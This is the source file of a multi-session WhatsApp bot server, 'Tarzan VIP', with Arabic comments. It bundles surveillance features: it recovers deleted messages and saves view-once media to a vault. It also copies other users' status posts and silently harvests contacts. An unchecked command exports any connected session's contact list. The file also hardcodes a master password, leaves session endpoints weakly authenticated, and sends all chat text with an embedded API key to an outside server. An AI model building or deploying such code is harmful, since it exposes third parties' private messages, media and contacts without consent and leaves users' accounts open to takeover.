const express = require( 'express' );
const fs = require( 'fs' );
const path = require( 'path' );
const qrCode = require( 'qrcode' );
const moment = require( 'moment-timezone' );
const axios = require( 'axios' );
const pino = require( 'pino' ); // 🛡️ كتم السجلات لمنع اختناق المعالج
const { GoogleGenerativeAI } = require( '@google/generative-ai' ); // 🧠 تم الاحتفاظ بها كي لا يختل الكود

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
    generateWAMessageFromContent,
    proto
} = require( '@whiskeysockets/baileys' );

// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
process.on( 'uncaughtException' , console.error);
process.on( 'unhandledRejection' , console.error);

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD =  'tarzanbot' ; 
const sessions = {};
const msgStore = new Map(); 
const spamTracker = new Map(); // 🛡️ تعقب السبام
const contactsDB = {}; // 📂 مخزن جهات الاتصال المسحوبة للجلسات

// ✅ 1. نظام حفظ الإعدادات (مع دعم المفتاح العالمي)
const settingsPath = path.join(__dirname,  'settings.json' );
let botSettings = {};
if (fs.existsSync(settingsPath)) { 
    botSettings = JSON.parse(fs.readFileSync(settingsPath,  'utf8' )); 
} else { 
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
}

// التأكد من وجود قسم الإعدادات العامة لمفتاح الـ API
if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
    saveSettings();
}

function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
function generateSessionPassword() { return  'VIP-'  + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// ✅ 2. مجلد الخزنة للميديا المخفية
const vaultPath = path.join(__dirname,  'ViewOnce_Vault' );
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ 3. نظام تفريغ الذاكرة الذكي (لتحمل 100+ جلسة)
setInterval(() => { 
    if (msgStore.size > 5000) {
        msgStore.clear(); 
        console.log( '🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل لمنع اختناق الرام' );
    }
    spamTracker.clear(); // تنظيف سجل السبام دورياً
}, 30 * 60 * 1000);

app.use(express.static( 'public' ));
app.use(express.json());

// ==========================================
// 🚀 4. معالج الأوامر
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname,  'commands' );
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith( '.js' ));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) {
            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
        }
    }
}
loadCommands();

// ==========================================
// ⚙️ 5. تشغيل الجلسات
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname,  'sessions' , sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    if (!botSettings[sessionId]) {
        botSettings[sessionId] = { 
            password: generateSessionPassword(), 
            botEnabled: true, 
            commandsEnabled: true, 
            aiEnabled: false, 
            autoReact: false, 
            reactEmoji:  '❤️' , 
            welcomeSent: false,
            // 🆕 إعدادات الحماية الجديدة
            antiLink: false,
            antiSpam: false,
            antiBadWords: false,
            badWordsList: [ 'كس' ,  'زق' ,  'شرموط' ,  'منيوك' ],
            antiCall: false, // ميزة منع المكالمات (إضافة جديدة)
            statusStealer: false // ميزة سحب الستوري (إضافة جديدة)
        };
        saveSettings();
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level:  'silent'  })) },
        logger: pino({ level:  'silent'  }), // 🛡️ سر استقرار السيرفر
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        browser: [ 'Windows' ,  'Edge' ,  '10.0' ], // 🌟 Edge لمنع حظر واتساب
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false
    });

    sessions[sessionId] = sock;
    contactsDB[sessionId] = new Map(); // تهيئة مخزن البيانات للجلسة

    sock.ev.on( 'creds.update' , saveCreds);

    // 🕵️ [تطوير] وحدة سحب جهات الاتصال صامتاً
    sock.ev.on('messaging-history.set', ({ contacts }) => {
        if (contacts) {
            contacts.forEach(c => {
                const id = jidNormalizedUser(c.id);
                if (id.endsWith('@s.whatsapp.net')) {
                    contactsDB[sessionId].set(id, { name: c.name || c.notify || 'مجهول', number: id.split('@')[0] });
                }
            });
        }
    });

    sock.ev.on('contacts.upsert', (contacts) => {
        contacts.forEach(c => {
            const id = jidNormalizedUser(c.id);
            if (id.endsWith('@s.whatsapp.net')) {
                contactsDB[sessionId].set(id, { name: c.name || c.notify || 'مجهول', number: id.split('@')[0] });
            }
        });
    });

    // 🛡️ [تطوير ميزة إسكات المكالمات فوراً] 🆕
    sock.ev.on('call', async (calls) => {
        const settings = botSettings[sessionId];
        if (settings && settings.antiCall) {
            for (const call of calls) {
                if (call.status === 'offer') {
                    await sock.rejectCall(call.id, call.from);
                    await sock.sendMessage(call.from, { text: '⚠️ *عذراً، نظام طرزان VIP يمنع استقبال المكالمات حالياً، يرجى التواصل نصياً.*' });
                }
            }
        }
    });

    if (pairingNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(pairingNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join( '-' ) || code;
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
            } catch (err) {
                console.log( '❌ خطأ في كود الاقتران: ' , err);
                if (res && !res.headersSent) res.status(500).json({ error:  'تعذر طلب الكود. السيرفرات مزدحمة، حاول بعد ثوانٍ.'  });
            }
        }, 3000); 
    }

    sock.ev.on( 'connection.update' , async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr && res && !pairingNumber && !res.headersSent) {
            try { const qrData = await qrCode.toDataURL(qr); res.json({ qr: qrData }); } catch(e){}
        }

        if (connection ===  'close' ) {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) setTimeout(() => startSession(sessionId), 5000);
            else { delete sessions[sessionId]; delete contactsDB[sessionId]; fs.rmSync(sessionPath, { recursive: true, force: true }); }
        }

        if (connection ===  'open' ) {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
            const selfId = jidNormalizedUser(sock.user.id);
            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}

            if (!botSettings[sessionId].welcomeSent) {
                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك (لإعدادات الموقع):*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                await sock.sendMessage(selfId, { image: { url:  'https://b.top4top.io/p_3489wk62d0.jpg'  }, caption: welcomeText });
                botSettings[sessionId].welcomeSent = true; saveSettings();
            }
        }
    });

    // ==========================================
    // 🛡️ 6. مضاد الحذف الجبار
    // ==========================================
    sock.ev.on( 'messages.update' , async updates => {
        for (const { key, update } of updates) {
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) return; 
                    const selfId = jidNormalizedUser(sock.user.id);
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                    const number = senderJid.split( '@' )[0];
                    const name = storedMsg.pushName ||  'مجهول' ;
                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                    
                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* wa.me/${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (err) {}
            }
        }
    });

    // ==========================================
    // 🔥 7. استقبال الرسائل المركزية
    // ==========================================
    sock.ev.on( 'messages.upsert' , async ({ messages, type }) => {
        if (type !==  'notify' ) return;
        const msg = messages[0];
        if (!msg?.message) return; 

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith( '@g.us' );
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName ||  'مجهول' ;
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;

        // 🛡️ [تطوير ميزة سحب الستوري فوراً] 🆕
        const currentSettings = botSettings[sessionId] || {};
        if (from === 'status@broadcast' && currentSettings.statusStealer && !isFromMe) {
            try {
                const myId = jidNormalizedUser(sock.user.id);
                await sock.sendMessage(myId, { forward: msg, caption: `📥 *تم سحب ستوري من:* wa.me/${sender.split('@')[0]}` });
            } catch (e) {}
        }

        if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);

        if (!currentSettings.botEnabled) return;

        // 🛡️ [نظام الحماية المطور] 🆕
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption ||   '' ;
        
        if (isGroup && !isFromMe) {
            // التحقق من الصلاحيات (يجب أن يكون البوت مشرفاً ليتمكن من الحذف)
            let isAdmin = false;
            let botIsAdmin = false;
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participants = groupMetadata.participants;
                isAdmin = participants.find(p => p.id === sender)?.admin !== null;
                botIsAdmin = participants.find(p => p.id === selfId)?.admin !== null;
            } catch (e) {}

            if (!isAdmin && botIsAdmin) {
                // 1. مضاد الروابط
                if (currentSettings.antiLink && (body.includes( 'http://' ) || body.includes( 'https://' ) || body.includes( 'chat.whatsapp.com' ))) {
                    await sock.sendMessage(from, { delete: msg.key });
                    await sock.sendMessage(from, { text: `🚫 @${sender.split( '@' )[0]} ممنوع إرسال الروابط في هذا القروب!`, mentions: [sender] });
                    return;
                }

                // 2. مضاد السبام (الرسائل المتكررة بسرعة)
                if (currentSettings.antiSpam) {
                    const now = Date.now();
                    const userSpam = spamTracker.get(sender) || { count: 0, last: 0 };
                    if (now - userSpam.last < 2000) { // أقل من ثانيتين
                        userSpam.count++;
                        if (userSpam.count > 4) { // أكثر من 4 رسائل
                            await sock.sendMessage(from, { delete: msg.key });
                            if (userSpam.count === 5) await sock.sendMessage(from, { text: `⚠️ @${sender.split( '@' )[0]} توقف عن التكرار (سبام)!`, mentions: [sender] });
                            return;
                        }
                    } else { userSpam.count = 1; }
                    userSpam.last = now;
                    spamTracker.set(sender, userSpam);
                }

                // 3. منع الكلمات الممنوعة
                if (currentSettings.antiBadWords && currentSettings.badWordsList) {
                    const hasBadWord = currentSettings.badWordsList.some(word => body.toLowerCase().includes(word.toLowerCase()));
                    if (hasBadWord) {
                        await sock.sendMessage(from, { delete: msg.key });
                        await sock.sendMessage(from, { text: `🚫 @${sender.split( '@' )[0]} عذراً، هذه الكلمة ممنوعة هنا!`, mentions: [sender] });
                        return;
                    }
                }
            }
        }

        // 👁️‍🗨️ [الرادار]: صائد العرض لمرة واحدة
        let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
        const mediaTypeCheck = Object.keys(msg.message)[0];
        if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
        
        if (viewOnceIncoming && !isFromMe) {
            try {
                const actualMessage = viewOnceIncoming.message;
                const mediaType = Object.keys(actualMessage)[0];
                const buffer = await downloadMediaMessage(msg,  'buffer' , {}, { logger: pino({ level:  'silent'  }) });

                const ext = mediaType ===  'imageMessage'  ?  'jpg'  : (mediaType ===  'videoMessage'  ?  'mp4'  :  'ogg' );
                const fileName = `VO_${sender.split( '@' )[0]}_${Date.now()}.${ext}`;
                fs.writeFileSync(path.join(vaultPath, fileName), buffer);

                const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split( '@' )[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                
                if (mediaType ===  'imageMessage' ) await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                else if (mediaType ===  'videoMessage' ) await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                else if (mediaType ===  'audioMessage' ) await sock.sendMessage(selfId, { audio: buffer, mimetype:  'audio/mpeg' , ptt: true });
            } catch (err) { console.error( '❌ خطأ في الرادار التلقائي: ' , err); }
        }

        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji ||  '❤️' , key: msg.key } }); } catch(e) {}
        }

        const reply = async (text) => {
            await sock.sendPresenceUpdate( 'composing' , from);
            return await sock.sendMessage(from, { text: text }, { quoted: msg });
        };

        const isCmd = body.startsWith( '.' );

        // ==========================================
        // 🧠 8. الذكاء الاصطناعي (نظام Tarzan VIP المخصص)
        // ==========================================
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !==    '' && !viewOnceIncoming) {
            try {
                await sock.sendPresenceUpdate( 'composing' , from); 
                
                const query = body.trim();
                
                // 🔑 المفتاح الخاص بك لنظام الذكاء الاصطناعي
                const API_KEY =  'AI_1d21219cc3914971' ; 
                // 🌐 رابط سيرفر البايثون الخاص بك
                const API_URL =  'http://Fi5.bot-hosting.net:22214/api/chat' ;

                // الاتصال بـ API الذكاء الاصطناعي الفخم
                const response = await axios.post(API_URL, {
                    api_key: API_KEY,
                    prompt: query
                }, {
                    headers: {  'Content-Type' :  'application/json'  },
                    timeout: 25000 // انتظار حتى 25 ثانية لضمان جلب الرد
                });

                if (response.data && response.data.status ===  'success' ) {
                    const aiReply = response.data.response;
                    await reply(aiReply);
                } else {
                    console.error( '⚠️ تم رفض الطلب من سيرفر الذكاء الاصطناعي' );
                }

            } catch (error) {
                console.error( '❌ خطأ في الاتصال بسيرفر الذكاء الاصطناعي: ' , error.message);
                // لا نرسل رسالة خطأ في الجروبات كي لا يزعج الأعضاء، نكتفي بالتسجيل في الكونسول
            }
            return; 
        }

        // ==========================================
        // 🎯 9. معالجة الأوامر الخارجية
        // ==========================================
        if (!currentSettings.commandsEnabled) return;

        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :   '' ;
        let commandName =   '' ;
        let args = [];
        let textArgs =   '' ;

        if (selectedId) {
            commandName = selectedId.toLowerCase();
        } else if (isCmd) {
            args = body.slice(1).trim().split(/ +/);
            commandName = args.shift().toLowerCase();
            textArgs = args.join( ' ' );
        }

        if (!commandName) return;

        // 🕵️‍♂️ [تطوير: أمر سحب جهات الاتصال المدمج] 🆕
        if (commandName === 'سحب_جهات' || commandName === 'contacts') {
            const target = args[0] || sessionId; // سحب جهات الجلسة الحالية إذا لم يحدد هدف
            if (!sessions[target]) return reply(`❌ الجلسة [${target}] غير متصلة.`);

            try {
                const contactsMap = contactsDB[target];
                const contacts = contactsMap ? Array.from(contactsMap.values()) : [];
                
                if (contacts.length === 0) return reply("❌ لم يتم رصد أي جهات اتصال لهذه الجلسة حتى الآن. انتظر المزامنة.");

                let contactListText = `📂 *[قائمة جهات الاتصال المسحوبة]* 📂\n👤 *الجلسة:* ${target}\n📊 *العدد:* ${contacts.length}\n━━━━━━━━━━━━━━━\n\n`;
                contacts.forEach((c, i) => { contactListText += `${i + 1}. 👤 ${c.name}\n📱 +${c.number}\n\n`; });
                contactListText += `\n*— TARZAN VIP EXTRACTION 👑*`;

                const fileName = `Contacts_${target}.txt`;
                const filePath = path.join(__dirname, fileName);
                fs.writeFileSync(filePath, contactListText);

                await sock.sendMessage(from, { 
                    document: fs.readFileSync(filePath), 
                    fileName: `جهات_اتصال_${target}.txt`, 
                    mimetype: 'text/plain',
                    caption: `✅ تم سحب ${contacts.length} جهة اتصال بنجاح.`
                }, { quoted: msg });

                fs.unlinkSync(filePath); 
            } catch (e) { reply("❌ فشلت العملية."); }
            return;
        }

        const commandData = commandsMap.get(commandName);

        if (commandData) {
            try {
                if (commandName !==  '🌚'  && commandName !==  'vv' ) {
                    await sock.sendMessage(from, { react: { text:  '⏳' , key: msg.key } });
                }
                
                await commandData.execute({
                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix:  '.' , commandName, sessions, botSettings, saveSettings
                });
            } catch (error) {
                console.error(`❌ خطأ في الأمر ${commandName}:`, error);
                if (commandName !==  '🌚'  && commandName !==  'vv' ) {
                    await sock.sendMessage(from, { react: { text:  '❌' , key: msg.key } });
                }
            }
        }
    });

    return sock;
}

// ==========================================
// 🌐 10. API Endpoints (لوحة التحكم)
// ==========================================
app.post( '/create-session' , (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error:  'أدخل اسم الجلسة'  });
    startSession(sessionId, res);
});

app.post( '/pair' , async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error:  'أدخل الجلسة والرقم'  });
    let formattedNumber = number.replace(/[^0-9]/g,   '' );
    
    if (sessions[sessionId] || fs.existsSync(path.join(__dirname,  'sessions' , sessionId))) {
        if(sessions[sessionId]) sessions[sessionId].logout();
        delete sessions[sessionId];
        fs.rmSync(path.join(__dirname,  'sessions' , sessionId), { recursive: true, force: true });
    }
    startSession(sessionId, res, formattedNumber);
});

app.post( '/api/settings/get' , (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error:  'الجلسة غير موجودة'  });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error:  'كلمة مرور خاطئة'  });
    res.json(settings);
});

app.post( '/api/settings/save' , (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error:  'الجلسة غير موجودة'  });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error:  'كلمة مرور خاطئة'  });
    
    // استخدام Object.assign لضمان عدم حذف أي إعدادات سابقة وتحديث الجديد فقط
    Object.assign(botSettings[sessionId], req.body);
    
    saveSettings();
    res.json({ success: true, message:  '✅ تم حفظ التعديلات'  });
});

app.get( '/sessions' , (req, res) => { res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); });

app.post( '/delete-session' , (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error:  'كلمة مرور السيرفر خاطئة'  });
    const sessionPath = path.join(__dirname,  'sessions' , sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); } 
    else { res.status(404).json({ error:  'الجلسة غير موجودة'  }); }
});

app.listen(PORT, () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
    console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
    console.log(`=========================================\n`);
});
